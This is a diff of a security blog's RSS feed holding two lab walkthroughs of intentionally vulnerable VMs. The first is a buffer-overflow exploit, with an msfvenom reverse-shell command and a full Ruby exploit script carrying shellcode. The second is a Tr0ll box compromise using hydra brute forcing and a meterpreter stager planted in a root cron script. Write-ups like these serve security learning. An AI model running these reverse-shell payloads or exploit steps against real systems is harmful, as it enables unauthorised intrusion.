+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/rs6S3Yf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After navigating through our binary, we have a place where we have user input. This is looking like it&amp;rsquo;s
+going to be a buffer overflow exploit. Once we download our application and run it through &lt;code&gt;gdb&lt;/code&gt;, we confirm
+that the report function is vulnerable.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/4CxBLoX.png&#34; alt=&#34;&#34; /&gt;
+&lt;img src=&#34;https://i.imgur.com/bD9RCyw.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bingo. Plug 0x41366641 into &lt;code&gt;pattern_offset&lt;/code&gt; we see that our buffer ends at 168, meaning our EIP register is
+at 169. If we inspect the assembly for the &lt;code&gt;report&lt;/code&gt; function, we see that our report string is stored in EAX.
+Because we have control of both EIP and EAX, it makes sense that we use this control to point one to the
+other. We can place our exploit at the beginning of EAX by simply injecting it as the &amp;ldquo;report&amp;rdquo;. We&amp;rsquo;ll then
+pad the input string until it&amp;rsquo;s 168 characters long. Then, well tell EIP that it should return to the
+beginning of EAX where our payload is waiting.  If we search to see if EAX is ever called, we can use that
+address in EIP.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/R7BFi8b.png&#34; alt=&#34;&#34; /&gt;
+&lt;img src=&#34;https://i.imgur.com/3yWsjBr.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets generate our shellcode and start to write the exploit.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.161 LPORT=4444 -f ruby -b &amp;quot;\x00\x0a\x0d&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;require &#39;socket&#39;
+
+host = &#39;192.168.1.162&#39;
+
+if ARGV[0] == &#39;knock&#39;
+  [7482, 8279, 9467].each do |port|
+    puts &amp;quot;knocking on #{port}&amp;quot;
+    `nmap -Pn --host_timeout 201 --max-retries 0 -p #{port} #{host} &amp;amp;&amp;gt;/dev/null`
+  end
+end
+
+buf = 
+&amp;quot;\xda\xd4\xd9\x74\x24\xf4\x58\xbb\xc8\x28\xf5\xc3\x29\xc9&amp;quot; +
+&amp;quot;\xb1\x12\x31\x58\x1a\x83\xc0\x04\x03\x58\x16\xe2\x3d\x19&amp;quot; +
+&amp;quot;\x2e\x34\x5e\x09\x93\xe8\xca\xac\xa3\x69\x83\x50\x0e\xf5&amp;quot; +
+&amp;quot;\x04\xc9\xf9\x36\x82\xef\x58\xde\xd0\xef\x8b\x43\x5d\x0e&amp;quot; +
+&amp;quot;\xc1\x1d\x05\x81\x47\xb5\x3c\xc0\x2b\xf4\xbe\xb1\xab\xbf&amp;quot; +
+&amp;quot;\xbe\xa5\xb3\xbf\x37\x26\x72\x54\x4b\x68\x96\xa7\xe3\x17&amp;quot; +
+&amp;quot;\x94\x38\x58\x61\xc7\xa0\xe8\x7d\xb8\xd0\xd9\xfe\x47\x37&amp;quot;
+
+eip = &amp;quot;\x63\x85\x04\x08&amp;quot;
+
+exploit = buf + &amp;quot;A&amp;quot;*70 + eip
+
+s = TCPSocket.new(host, 7788)
+puts s.readpartial(512)
+s.write(&amp;quot;48093572\n&amp;quot;)
+
+puts s.readpartial(512)
+s.write(&amp;quot;3\n&amp;quot;)
+
+puts s.readpartial(512)
+s.write(exploit + &amp;quot;\n&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let&amp;rsquo;s run it!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ImmvfQj.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And there we have it! Thanks for reading!&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -49,10 +535,127 @@ Check that out! Our first flag was hidden in http://imf/contact.php. This looks 
       <pubDate>Thu, 20 Oct 2016 20:57:00 -0400</pubDate>
       
       <guid>https://sec.alexflor.es/post/b2r_troll_walkthrough/</guid>
-      <description>A couple of weeks ago, work sent me to a security class for an upcoming product. While there, I learned about vulnhub, a repository of intentionally vulnerable virtual machines for anyone to compromise. Since coming back, vulnhub has become my new obsession. Here&amp;rsquo;s a walkthrough of my attempt.
-Note: I struggled a bit more that this writeup lets on. The struggle is ommited for clarity and brevity.
-__
-After finding the VM with an nmap scan, we see a couple of open ports.</description>
+      <description>&lt;p&gt;A couple of weeks ago, work sent me to a security class for an upcoming product. While there, I learned about
+&lt;a href=&#34;https://vulnhub.com&#34;&gt;vulnhub&lt;/a&gt;, a repository of intentionally vulnerable virtual machines for anyone to
+compromise. Since coming back, vulnhub has become my new obsession. Here&amp;rsquo;s a walkthrough of my attempt.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Note: I struggled a bit more that this writeup lets on. The struggle is ommited for clarity and brevity.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;__&lt;/p&gt;
+
+&lt;p&gt;After finding the VM with an nmap scan, we see a couple of open ports.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2100:03:55.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Upon browsing to the web page, we&amp;rsquo;re greeted with our good friend, the troll.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2111:10:57.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With the CTFs I&amp;rsquo;ve done so far, I&amp;rsquo;ve run &lt;code&gt;nikto&lt;/code&gt; or &lt;code&gt;uniscan&lt;/code&gt;, to find useful information about the site.
+There&amp;rsquo;s almost always a &lt;code&gt;robots.txt&lt;/code&gt; file. Let&amp;rsquo;s start there.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2111:15:06.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;OK, so another troll face. Uniscan and Nikto brought up nothing either. I guess it&amp;rsquo;s off to the FTP service
+then.&lt;/p&gt;
+
+&lt;p&gt;I run &lt;code&gt;nmap -A&lt;/code&gt; against the FTP port and see that I get a name and version number. Searchsploit doesn&amp;rsquo;t turn
+up anything useful so I try to log in as an anonymous user and bingo; next clue.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2111:20:43.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s take a look at what&amp;rsquo;s inside (superfluous &lt;code&gt;grep&lt;/code&gt; added for display purposes)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2111:44:15.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we get the string &amp;lsquo;sup3rs3cr3tdirlol&amp;rsquo;. Navigating there gets a directory listing with one file. Let&amp;rsquo;s
+download it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;$&amp;gt; curl -L 192.168.110.103/sup3rs3cr3tdirlol/roflmao
+$&amp;gt; file roflmao
+# shows it&#39;s a binary file
+
+$&amp;gt; strings roflmao
+# ..snip..
+# Find address 0x0856BF to proceed
+# ..snip..
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;During CTFs I usually append unique words I run into to a dictionary so I can either use them for brute force
+attacks or for enumerating web directories with a tool like &lt;code&gt;dirbuster&lt;/code&gt;. It wasn&amp;rsquo;t very long at this point
+and given the trolling nature of this challenge so far I thought maybe I should take our string&amp;rsquo;s words
+literally. That, and it wasn&amp;rsquo;t a real memory address at only 3 bytes long.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2112:04:00.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Awesome! I downloaded the files which had what looked like usernames and a single password. One folder was
+called &amp;lsquo;this_folder_contains_the_password&amp;rsquo;. Again, taking things literally, I made a quick and dirty script
+to take all the words in this folder and append them to my wordlist.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby.prettyprint&#34;&gt;require &#39;nokogiri&#39;
+require &#39;open-uri&#39;
+
+url = &#39;http://192.168.110.103/0x0856BF/this_folder_contains_the_password&#39;
+data = open(url).read
+page = Nokogiri::HTML(data)
+
+def print_tree(node, list = [])
+  return list if node.children.empty?
+  node.children.inject(list) do |memo, child|
+    text = child.text.split(&amp;quot; &amp;quot;).map(&amp;amp;:strip) unless child.text.nil?
+    memo.push(*text) if text
+    print_tree(child, memo)
+  end
+end
+
+puts print_tree(page).to_a.sort.uniq
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;ruby scrape.rb &amp;gt;&amp;gt; word.list
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This seemed like a good time to attack the ssh port with &lt;code&gt;hydra&lt;/code&gt; and our new lists. After a couple of
+attempts, the SSH port stopped letting me try to authenticate. I went through the attack again, reversing the
+user list, password list, then both, waiting for the ssh port to reset between attempts. And then&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2113:45:29.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once we&amp;rsquo;re logged in, we&amp;rsquo;re immediately kicked off and we see the following message:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2113:50:33.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;OK, after a few more logons, I notice it happens every 5 minutes&amp;hellip; cron job.&lt;/p&gt;
+
+&lt;p&gt;In the meantime, I uploaded an enumeration script to &lt;code&gt;/tmp&lt;/code&gt;, but notice that it also gets deleted about every
+2 minutes. Another cron job?&lt;/p&gt;
+
+&lt;p&gt;I tried to manually see if there were any SUID binaries to exploit or any world-writable files&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;find / --perm 6000
+find / --perm 0777
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There are! It&amp;rsquo;s a long list but 1 stands out: &lt;code&gt;/lib/log/cleaner.py&lt;/code&gt; The contents of the file looks
+like it wipes the &lt;code&gt;/tmp&lt;/code&gt; directory. This must be the file that &lt;code&gt;cron&lt;/code&gt; runs.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2113:54:51.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thank goodness it&amp;rsquo;s writable ;) I I start a meterpreter listener and replace the &lt;code&gt;cleaner.py&lt;/code&gt; contents with a
+stager.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2114:03:47.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since the owner of the &lt;code&gt;cleaner.py&lt;/code&gt; file was root, and the meterpreter stager was now the contents of the
+file&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2114:04:41.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we can take a look at the cron jobs to see what was trolling us and also at the flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2114:11:12.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There we have it! This was so fun! CTF VMs have completely replaced video games for me.&lt;/p&gt;
+</description>
     </item>
     
   </channel>
